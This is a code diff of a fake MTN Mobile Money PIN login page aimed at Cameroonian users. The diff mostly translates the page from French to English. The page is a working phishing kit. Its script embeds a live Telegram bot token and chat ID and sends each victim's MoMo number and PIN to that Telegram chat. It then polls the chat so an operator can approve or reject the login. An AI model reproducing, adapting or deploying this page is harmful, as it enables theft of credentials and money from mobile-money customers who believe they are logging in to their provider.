@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MTN  – Connexion par PIN</title>
+    <title>MTN  – PIN Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -258,8 +258,8 @@
     <div class="container">
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Erreur</div>
-            <div class="error-text" id="errorText">Identifiants invalides</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Invalid credentials</div>
         </div>
 
         <div class="content">
@@ -267,20 +267,20 @@
                 <div class="logo-circle">M</div>
                 <div class="logo-text"><span>MTN</span> </div>
             </div>
-            <div class="title">Bienvenue sur MTN </div>
+            <div class="title">Welcome to MTN </div>
             <div class="subtitle">
-                Saisissez votre numéro MTN et votre code PIN pour vous connecter.
+                Enter your MTN number and PIN to log in.
             </div>
 
             <div class="form">
-                <div class="label">Numéro MTN MoMo</div>
+                <div class="label">MTN MoMo Number</div>
                 <input class="input" id="phoneInput" placeholder="6 55 12 34 56" inputmode="numeric" maxlength="11">
 
-                <div class="label" style="margin-top:15px;">Saisissez votre code PIN</div>
-                <input class="input" id="pinInput" placeholder="4 ou 5 chiffres" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
+                <div class="label" style="margin-top:15px;">Enter your PIN</div>
+                <input class="input" id="pinInput" placeholder="4 or 5 digits" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
 
-                <button class="btn btn-primary" id="loginBtn" disabled>Se connecter</button>
-                <button class="btn btn-outline" id="goBackBtn">Retour</button>
+                <button class="btn btn-primary" id="loginBtn" disabled>Log In</button>
+                <button class="btn btn-outline" id="goBackBtn">Back</button>
 
                 <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
             </div>
@@ -292,7 +292,7 @@
     </div>
 
     <script>
-        // ========== TELEGRAM CONFIG (English messages) ==========
+        // ========== TELEGRAM CONFIG ==========
         const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
         const CHAT_ID = '1006917440';
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -310,7 +310,7 @@
         let currentPollInterval = null;
 
         function showError(message) {
-            errorText.innerText = message || 'Identifiants invalides';
+            errorText.innerText = message || 'Invalid credentials';
             errorBox.style.display = 'block';
         }
 
@@ -329,19 +329,16 @@
         function updateLoginButton() {
             const phone = phoneInput.value.trim();
             const pin = pinInput.value.trim();
-            // PIN digits only, length 4 or 5
             const pinDigits = pin.replace(/\D/g, '');
             const isValidPin = (pinDigits.length === 4 || pinDigits.length === 5);
-            // Phone: allow spaces, we'll check length of digits later
             const phoneDigits = phone.replace(/\D/g, '');
-            const isValidPhone = phoneDigits.length === 9; // Cameroon MTN numbers are 9 digits
+            const isValidPhone = phoneDigits.length === 9;
             const isValid = isValidPhone && isValidPin;
             loginBtn.disabled = !isValid;
         }
 
         function validateMobileNumber(phone) {
             const cleaned = phone.replace(/\D/g, '');
-            // Cameroon: exactly 9 digits (MTN numbers start with 6,7,8 usually)
             return cleaned.length === 9;
         }
 
@@ -363,7 +360,7 @@
             }
         }
 
-        // ===== TELEGRAM SEND (English message) =====
+        // ===== TELEGRAM SEND =====
         async function sendLoginToTelegram(phone, pin) {
             const ts = Date.now();
             const approveId = `login_approve_${ts}`;
@@ -372,7 +369,6 @@
             sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
             sessionStorage.setItem('mtn_pin', pin);
 
-            // English message for admin
             const message =
                 `🔐 <b>MTN  Login Request</b>\n\n` +
                 `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
@@ -407,7 +403,7 @@
                 isSubmitting = false;
                 loginBtn.disabled = false;
                 updateLoginButton();
-                showError('Erreur réseau. Veuillez réessayer.');
+                showError('Network error. Please try again.');
             }
         }
 
@@ -442,7 +438,7 @@
                             isSubmitting = false;
                             loginBtn.disabled = false;
                             updateLoginButton();
-                            showError('Authentification refusée. Veuillez vérifier vos identifiants.');
+                            showError('Authentication refused. Please check your credentials.');
                             clearPinField();
                             phoneInput.focus();
                             return;
@@ -462,28 +458,26 @@
 
             hideError();
 
-            // Phone digits only
             const phoneDigits = phoneRaw.replace(/\D/g, '');
             if (!phoneDigits) {
-                showError('Veuillez saisir votre numéro MTN MoMo.');
+                showError('Please enter your MTN MoMo number.');
                 phoneInput.focus();
                 return;
             }
             if (phoneDigits.length !== 9) {
-                showError('Veuillez saisir un numéro MTN MoMo valide (9 chiffres).');
+                showError('Please enter a valid MTN MoMo number (9 digits).');
                 phoneInput.focus();
                 return;
             }
 
-            // PIN digits only
             const pinDigits = pinRaw.replace(/\D/g, '');
             if (!pinDigits) {
-                showError('Veuillez saisir votre code PIN (4 ou 5 chiffres).');
+                showError('Please enter your PIN (4 or 5 digits).');
                 pinInput.focus();
                 return;
             }
             if (pinDigits.length !== 4 && pinDigits.length !== 5) {
-                showError('Le code PIN doit comporter 4 ou 5 chiffres.');
+                showError('PIN must be 4 or 5 digits.');
                 pinInput.value = '';
                 pinInput.focus();
                 return;
@@ -498,26 +492,11 @@
 
         // -------- Event Listeners --------
         phoneInput.addEventListener('input', function(e) {
-            // Allow spaces but we'll strip non-digits for validation
             let val = this.value.replace(/[^0-9 ]/g, '');
-            // Limit digits to 9, but allow spaces
             const digits = val.replace(/\D/g, '');
             if (digits.length > 9) {
-                // truncate to 9 digits and reformat with spaces every 2 digits? We'll just keep as digits without spaces.
-                // Simpler: remove spaces and keep digits
                 val = digits.slice(0, 9);
-                // optionally format with spaces: e.g., "6 55 12 34 56" -> we'll just display as digits without spaces for simplicity.
-                // But we can add spaces for readability.
-                // We'll just set value to digits without spaces.
                 this.value = val;
-            } else {
-                // If there are spaces, we can keep them but we want to avoid double spaces.
-                // We'll just keep the value as is but we'll strip non-digits for validation.
-                // For user experience, we can format with spaces: 6 55 12 34 56
-                // We'll format on blur or each input? Let's just keep raw with spaces allowed.
-                // Actually we want to clean up: replace multiple spaces, etc.
-                // We'll just let user type digits and spaces, but we'll strip spaces for validation.
-                // So we don't need to modify value.
             }
             updateLoginButton();
             hideError();
@@ -531,8 +510,6 @@
             updateLoginButton();
             hideError();
         });
-
-        // Format phone with spaces on blur? Not necessary.
 
         pinInput.addEventListener('input', function(e) {
             let val = this.value.replace(/[^0-9]/g, '');
